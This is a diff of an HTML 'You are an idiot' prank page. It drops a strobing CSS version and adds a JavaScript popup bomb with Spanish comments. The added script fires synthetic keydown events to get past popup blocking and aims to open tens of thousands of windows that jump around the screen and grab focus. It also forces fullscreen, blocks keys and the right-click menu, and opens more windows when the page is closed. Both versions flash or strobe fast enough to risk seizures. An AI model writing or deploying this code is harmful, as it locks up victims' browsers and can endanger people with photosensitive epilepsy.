@@ -2,169 +2,161 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>⚠ SYSTEM OVERLOAD ⚠</title>
-<script src="you.js"></script>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body {
-    overflow: hidden;
-    width: 100vw; height: 100vh;
-    cursor: none;
-}
-#main {
-    width: 100vw; height: 100vh;
-    display: flex; flex-direction: column;
-    align-items: center; justify-content: center;
-    text-align: center;
-    user-select: none;
-    position: relative;
-}
-.bg-overlay {
-    position: fixed; top: 0; left: 0;
-    width: 100%; height: 100%;
-    z-index: -1;
-    animation: hyperStrobe 0.05s infinite;
-}
-@keyframes hyperStrobe {
-    0%   { background: #ff0000; }
-    5%   { background: #00ff00; }
-    10%  { background: #0000ff; }
-    15%  { background: #ffff00; }
-    20%  { background: #ff00ff; }
-    25%  { background: #00ffff; }
-    30%  { background: #ffffff; }
-    35%  { background: #000000; }
-    40%  { background: #ff6600; }
-    45%  { background: #9900ff; }
-    50%  { background: #ff0000; }
-    55%  { background: #00ff00; }
-    60%  { background: #0000ff; }
-    65%  { background: #ffff00; }
-    70%  { background: #ff00ff; }
-    75%  { background: #00ffff; }
-    80%  { background: #ffffff; }
-    85%  { background: #000000; }
-    90%  { background: #ff6600; }
-    95%  { background: #9900ff; }
-    100% { background: #ff0000; }
-}
-h1 {
-    font-size: 6vw;
-    font-family: Arial, sans-serif;
-    font-weight: bold;
-    color: #000;
-    text-shadow: 
-        3px 3px 0 #fff, -3px -3px 0 #fff, 
-        3px -3px 0 #fff, -3px 3px 0 #fff,
-        0 0 20px #fff, 0 0 40px #fff;
-    animation: hyperFlash 0.08s infinite;
-    position: relative;
-    z-index: 10;
-}
-@keyframes hyperFlash {
-    0%, 100% { opacity: 1; transform: scale(1) rotate(0deg); }
-    10% { opacity: 0; transform: scale(1.5) rotate(15deg); }
-    20% { opacity: 1; transform: scale(0.5) rotate(-10deg); }
-    30% { opacity: 0; transform: scale(2) rotate(20deg); }
-    40% { opacity: 1; transform: scale(1) rotate(-5deg); }
-    50% { opacity: 0; transform: scale(1.8) rotate(10deg); }
-    60% { opacity: 1; transform: scale(0.3) rotate(-20deg); }
-    70% { opacity: 0; transform: scale(2.5) rotate(30deg); }
-    80% { opacity: 1; transform: scale(1) rotate(0deg); }
-    90% { opacity: 0; transform: scale(1.4) rotate(-15deg); }
-}
-
-/* Lluvia de caracteres Matrix */
-.matrix-rain {
-    position: fixed; top: 0; left: 0;
-    width: 100%; height: 100%;
-    z-index: 5;
-    pointer-events: none;
-    font-family: monospace;
-    font-size: 20px;
-    color: #0f0;
-    opacity: 0.8;
-}
-
-/* Ventanas flotantes falsas */
-.fake-popup {
-    position: fixed;
-    width: 200px; height: 150px;
-    border: 3px solid #ff0000;
-    background: rgba(255, 255, 255, 0.95);
-    z-index: 100;
-    display: flex; align-items: center; justify-content: center;
-    font-family: Arial; font-weight: bold; font-size: 18px;
-    text-align: center;
-    box-shadow: 0 0 20px rgba(255,0,0,0.5);
-    animation: fakePopupAnim 0.5s infinite alternate;
-    cursor: pointer;
-    user-select: none;
-}
-@keyframes fakePopupAnim {
-    from { transform: scale(1) rotate(0deg); box-shadow: 0 0 10px red; }
-    to { transform: scale(1.2) rotate(5deg); box-shadow: 0 0 30px red; }
-}
-
-/* Barras de progreso falsas */
-.fake-progress {
-    position: fixed;
-    width: 300px;
-    z-index: 200;
-    background: rgba(0,0,0,0.9);
-    color: #0f0;
-    font-family: monospace;
-    font-size: 12px;
-    padding: 10px;
-    border: 1px solid #0f0;
-}
-.fake-progress .bar {
-    width: 100%; height: 20px;
-    background: #333;
-    border: 1px solid #0f0;
-    margin-top: 5px;
-}
-.fake-progress .bar-fill {
-    height: 100%; width: 0%;
-    background: #0f0;
-    animation: fillBar 2s infinite;
-}
-@keyframes fillBar {
-    0% { width: 0%; }
-    100% { width: 100%; }
-}
-
-/* Alertas falsas */
-.fake-alert {
-    position: fixed;
-    width: 350px;
-    padding: 20px;
-    background: #fff;
-    border: 2px solid #000;
-    z-index: 300;
-    box-shadow: 0 0 50px rgba(0,0,0,0.5);
-    font-family: Arial;
-    text-align: center;
-}
-.fake-alert h3 { color: #ff0000; margin-bottom: 10px; }
-.fake-alert button {
-    background: #ccc;
-    border: 1px solid #999;
-    padding: 5px 20px;
-    margin: 5px;
-    cursor: pointer;
-}
-.fake-alert button:hover { background: #aaa; }
-</style>
+<title>You are an idiot</title>
 </head>
-<body onload="initFullscreen()" onunload="procreate()" onbeforeunload="return false">
+<body style="background:#fff;overflow:hidden;margin:0;cursor:none;">
 
-<div class="bg-overlay"></div>
-<div id="main">
-    <h1>⚠ YOU ARE AN IDIOT ⚠</h1>
-    <h1>⚠ SYSTEM OVERLOAD ⚠</h1>
-    <h1>⚠ CRITICAL ERROR ⚠</h1>
-</div>
+<h1 style="font-size:10vw;font-family:Arial;text-align:center;margin-top:20vh;animation:fl 0.1s infinite;">
+YOU ARE AN IDIOT
+</h1>
+<style>
+@keyframes fl { 0%,100%{opacity:1} 50%{opacity:0} }
+</style>
+
+<script>
+// ================================================================
+// TÉCNICA REAL: BOMBARDEO DE EVENTOS SINTÉTICOS
+// ================================================================
+
+// Cada popup necesita un evento de usuario individual.
+// Creamos miles de eventos keydown y los disparamos.
+// CADA evento abre UN popup.
+
+var wins = [];
+var totalAbiertas = 0;
+var MAX = 50000; // Máximo de ventanas a abrir
+
+// ================================================================
+// 1. CREAR UN KEYDOWN FALSO Y ABRIR UN POPUP
+// ================================================================
+
+function dispararUnPopup(url) {
+    if (totalAbiertas >= MAX) return;
+    
+    // Escuchamos el evento UNA SOLA VEZ
+    function handler(e) {
+        document.removeEventListener('keydown', handler);
+        
+        try {
+            var nombreUnico = 'w' + Date.now() + '_' + totalAbiertas + '_' + Math.random().toString(36).substr(2,6);
+            var p = window.open(url, nombreUnico,
+                'width=180,height=175,left=' + (Math.random() * screen.width) + ',top=' + 
+                (Math.random() * screen.height) + ',menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no');
+            
+            if (p && !p.closed) {
+                wins.push(p);
+                totalAbiertas++;
+                // Hacer que baile
+                hacerBailar(p);
+            }
+        } catch(e) {}
+    }
+    
+    document.addEventListener('keydown', handler);
+    
+    // Disparamos el evento sintético
+    var evt = new KeyboardEvent('keydown', {
+        key: 'Enter', keyCode: 13, which: 13,
+        code: 'Enter', bubbles: true, cancelable: true
+    });
+    document.dispatchEvent(evt);
+}
+
+// ================================================================
+// 2. HACER BAILAR LAS VENTANAS
+// ================================================================
+
+function hacerBailar(p) {
+    var x = Math.random() * (screen.width - 200);
+    var y = Math.random() * (screen.height - 200);
+    var dx = (Math.random() - 0.5) * 30;
+    var dy = (Math.random() - 0.5) * 30;
+    
+    function baila() {
+        if (!p || p.closed) return;
+        try {
+            x += dx; y += dy;
+            if (x < 0 || x > screen.width - 180) dx *= -1;
+            if (y < 0 || y > screen.height - 175) dy *= -1;
+            if (Math.random() < 0.05) { dx = (Math.random()-0.5)*40; dy = (Math.random()-0.5)*40; }
+            p.moveTo(Math.round(x), Math.round(y));
+            try { p.focus(); } catch(e) {}
+            setTimeout(baila, 8);
+        } catch(e) {
+            setTimeout(baila, 50);
+        }
+    }
+    baila();
+}
+
+// ================================================================
+// 3. PROCREATE (al cerrar)
+// ================================================================
+
+function procreate() {
+    for (var i = 0; i < 40; i++) {
+        setTimeout(function() { dispararUnPopup('open.html'); }, i * 5);
+    }
+}
+
+// ================================================================
+// 4. LANZAMIENTO MASIVO
+// ================================================================
+
+function lanzarTormenta() {
+    // FASE 1: 500 popups en 5 segundos (100 por segundo)
+    for (var i = 0; i < 500; i++) {
+        setTimeout(function() { dispararUnPopup('open.html'); }, i * 10);
+    }
+    
+    // FASE 2: 1000 popups más (200 por segundo)
+    setTimeout(function() {
+        for (var i = 0; i < 1000; i++) {
+            setTimeout(function() { dispararUnPopup('open.html'); }, i * 5);
+        }
+    }, 6000);
+    
+    // FASE 3: 3000 popups más (300 por segundo)
+    setTimeout(function() {
+        for (var i = 0; i < 3000; i++) {
+            setTimeout(function() { dispararUnPopup('open.html'); }, i * 3);
+        }
+    }, 12000);
+    
+    // FASE 4: Oleada infinita — 50 cada segundo para siempre
+    setInterval(function() {
+        for (var i = 0; i < 50; i++) {
+            setTimeout(function() { dispararUnPopup('open.html'); }, i * 2);
+        }
+    }, 1000);
+    
+    // Refuerzo constante: 1 cada 5ms (200/segundo)
+    setInterval(function() {
+        dispararUnPopup('open.html');
+    }, 5);
+}
+
+// ================================================================
+// 5. INICIO
+// ================================================================
+
+// Forzar fullscreen
+try {
+    var d = document.documentElement;
+    (d.requestFullscreen || d.webkitRequestFullscreen || d.mozRequestFullScreen || d.msRequestFullscreen).call(d);
+} catch(e) {}
+
+// Bloquear teclas
+window.onbeforeunload = function() { return " "; };
+window.onkeydown = document.onkeydown = function(e) { e.preventDefault(); return false; };
+document.oncontextmenu = function(e) { e.preventDefault(); return false; };
+
+// Primera descarga masiva
+setTimeout(lanzarTormenta, 500);
+
+// Si se cierra la ventana, más
+window.onunload = procreate;
+</script>
 
 </body>
 </html>
